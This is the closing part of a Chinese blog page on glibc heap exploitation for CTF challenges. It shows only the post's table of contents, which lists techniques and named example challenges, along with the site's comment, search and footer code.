href="#%E2%91%A1%E5%89%8D%E5%90%91%E5%90%88%E5%B9%B6%EF%BC%9A%E8%8B%A5%E4%B8%BAtop-chunk%E5%88%99%E5%90%88%E5%B9%B6%E5%85%A5top-chunk%E4%B8%AD%EF%BC%8C%E5%90%A6%E5%88%99%E4%BC%9A%E5%B0%9D%E8%AF%95%E5%90%88%E5%B9%B6%E5%90%8E%E6%8F%92%E5%85%A5unsorted-bin%E4%B8%AD"><span class="toc-text">②前向合并：若为top chunk则合并入top chunk中，否则会尝试合并后插入unsorted_bin中</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89nextchunk%E4%B8%BAtop-chunk"><span class="toc-text">1）nextchunk为top chunk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%EF%BC%89nextchunk%E4%B8%8D%E4%B8%BAtop-chunk"><span class="toc-text">5）nextchunk不为top chunk</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E6%A3%80%E6%9F%A5%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AAchunk%EF%BC%8C%E4%B8%8D%E4%B8%BANULL%E5%88%99%E7%BB%A7%E7%BB%AD%E6%96%B0%E4%B8%80%E8%BD%AE%E5%BE%AA%E7%8E%AF"><span class="toc-text">③检查链表中的下一个chunk，不为NULL则继续新一轮循环</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">0x04.基础的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-text">一、地址泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bins-libc-%E5%9F%BA%E5%9D%80"><span class="toc-text">bins - libc 基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-FILE-libc-%E5%9F%BA%E5%9D%80"><span class="toc-text">_IO_FILE - libc 基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-key-%E5%A0%86%E5%9F%BA%E5%9D%80%EF%BC%88only-libc2-29-and-up%EF%BC%89"><span class="toc-text">tcache key - 堆基址（only libc2.29 and up）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#safe-linking-in-tcache-%E5%A0%86%E5%9F%BA%E5%9D%80%EF%BC%88only-libc2-32-and-up%EF%BC%89"><span class="toc-text">safe-linking in tcache - 堆基址（only libc2.32 and up）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81use-after-free"><span class="toc-text">二、use after free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aciscn-2019-n-3-Use-After-Free"><span class="toc-text">例题：ciscn_2019_n_3 - Use After Free</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0double-free"><span class="toc-text">①double free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#I-fastbin-double-free"><span class="toc-text">I.fastbin double free</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#size%E6%A3%80%E6%9F%A5"><span class="toc-text">size检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc-hook-0x23"><span class="toc-text">__malloc_hook - 0x23</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget"><span class="toc-text">例题：bytectf2019 - mulnote - use after free + fastbin attack + one_gadget</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#II-tcache-double-free"><span class="toc-text">II.tcache double free</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aciscn-2019-es-1-Use-After-Free-tcache-poisoning"><span class="toc-text">例题：ciscn_2019_es_1 - Use After Free + tcache poisoning</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#III-tcache-key-bypass%EF%BC%88libc-2-29-and-up%EF%BC%89"><span class="toc-text">III.tcache key bypass（libc 2.29 and up）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%88%E6%B8%85%E9%99%A4tcache-key%EF%BC%89%EF%BC%9Abytectf2020-final-awd-day1-diary"><span class="toc-text">例题1（清除tcache key）：bytectf2020 - final - awd day1 - diary</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3"><span class="toc-text">例题2（fastbin double free）：ciscn_2019_final_3</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A0%86%E9%87%8D%E5%8F%A0%EF%BC%88Heap-Overlapping%EF%BC%89"><span class="toc-text">三、堆重叠（Heap Overlapping）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><span class="toc-text">例题：*CTF2021 - babyheap - Use After Free + tcache poisoning</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-text">四、堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ababyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span class="toc-text">例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one"><span class="toc-text">off by one</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="toc-text">例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-text">off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9ALCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><span class="toc-text">例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81Safe-Linkling-bypass%EF%BC%88glibc-2-32-and-up%EF%BC%89"><span class="toc-text">五、Safe-Linkling bypass（glibc 2.32 and up）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><span class="toc-text">例题：[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81Unlink"><span class="toc-text">六、Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><span class="toc-text">例题：hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%A0%86%E9%A3%8E%E6%B0%B4%EF%BC%88Heap-Fengshui%EF%BC%89"><span class="toc-text">七、堆风水（Heap Fengshui）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ababyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><span class="toc-text">例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81ROP-in-heap-exploit"><span class="toc-text">八、ROP in heap exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#environ"><span class="toc-text">__environ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AminiLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><span class="toc-text">例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setcontext"><span class="toc-text">setcontext</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><span class="toc-text">例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81IO-FILE-exploit"><span class="toc-text">九、IO_FILE exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vtable-hijack"><span class="toc-text">vtable hijack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><span class="toc-text">例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%AD-vtable-%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB"><span class="toc-text">_IO_FILE_plus结构体中 vtable 相对偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable-%E5%90%88%E6%B3%95%E6%80%A7%E6%A3%80%E6%B5%8B-start-from-glibc2-24"><span class="toc-text">vtable 合法性检测(start from glibc2.24)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%A7%BF%E5%8A%BF-under-glibc2-28"><span class="toc-text">vtable表劫持姿势(under glibc2.28)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FSOP"><span class="toc-text">FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-list-all-%E9%93%BE%E8%A1%A8"><span class="toc-text">_IO_list_all 链表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-flush-all-lockp"><span class="toc-text">_IO_flush_all_lockp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><span class="toc-text">例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%9B%B4%E5%8A%A0%E9%AB%98%E7%BA%A7%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-text">0x04.更加高级的攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Botcake-%E6%9C%BA%E9%A5%BC%E3%81%AE%E6%89%80"><span class="toc-text">House of Botcake - 机饼の所</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Einherjar-%E8%8B%B1%E7%81%B5%E3%81%AE%E5%B1%8B"><span class="toc-text">House of Einherjar - 英灵の屋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2016-Seccon-tinypad"><span class="toc-text">例题：2016 Seccon tinypad</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Force-%E5%8A%9B%E3%81%AE%E9%87%91%E9%98%81%EF%BC%88not-available-from-glibc-2-29%EF%BC%89"><span class="toc-text">House of Force - 力の金阁（not available from glibc 2.29）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Agyctf-2020-force-House-of-Force"><span class="toc-text">例题：gyctf_2020_force - House of Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Husk-%E5%A3%B3%E5%B1%82%E3%81%AE%E4%BB%93"><span class="toc-text">House of Husk - 壳层の仓</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9ACCISC2020-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Pwn5"><span class="toc-text">例题：CCISC2020-华东北赛区-Pwn5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Kiwi-%E9%A3%9E%E9%B8%9F%E3%81%AE%E7%AC%BC%E5%BC%82%E6%9E%9C%E3%81%AE%E7%AF%AE"><span class="toc-text">House of Kiwi - 飞鸟の笼异果の篮</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-NepCTF2021-NULL-FxCK"><span class="toc-text">例题：  NepCTF2021 NULL_FxCK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Lore-%E4%BC%A0%E8%AF%B4%E3%81%AE%E5%B1%8B"><span class="toc-text">House of Lore - 传说の屋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange-%E6%96%B0%E6%A9%99%E3%81%AE%E5%AE%A4"><span class="toc-text">House of Orange - 新橙の室</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahouseoforange-hitcon-2016-House-of-Orange"><span class="toc-text">例题：houseoforange_hitcon_2016 - House of Orange</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Rabbit-%E5%85%94%E5%AD%90%E3%81%AE%E7%AA%9D"><span class="toc-text">House of Rabbit - 兔子の窝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AHITB-GSEC-XCTF-2018-mutepig"><span class="toc-text">例题：HITB-GSEC-XCTF 2018 mutepig</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman-%E7%BD%97%E9%A9%AC%E3%81%AE%E5%AE%B6"><span class="toc-text">House of Roman - 罗马の家</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-npuctf-2020-bad-guy"><span class="toc-text">例题： npuctf_2020_bad_guy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Spirit-%E7%B2%BE%E7%A5%9E%E3%81%AE%E9%99%A2"><span class="toc-text">House of Spirit - 精神の院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9ALCTF2016-PWN200"><span class="toc-text">例题：LCTF2016_PWN200</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Storm-%E9%A3%8E%E6%9A%B4%E3%81%AE%E5%9F%9F"><span class="toc-text">House of Storm - 风暴の域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A0ctf2018-heapstorm2"><span class="toc-text">例题：0ctf2018_ heapstorm2</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: '说点什么呗...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90PWN.0x01%E3%80%91%E7%AE%80%E6%98%93%20Glibc%20heap%20exploit%20%E7%AC%94%E8%AE%B0 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F05%2F10%2FPWN-0X01-GLIBC_HEAP-EXPLOIT%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
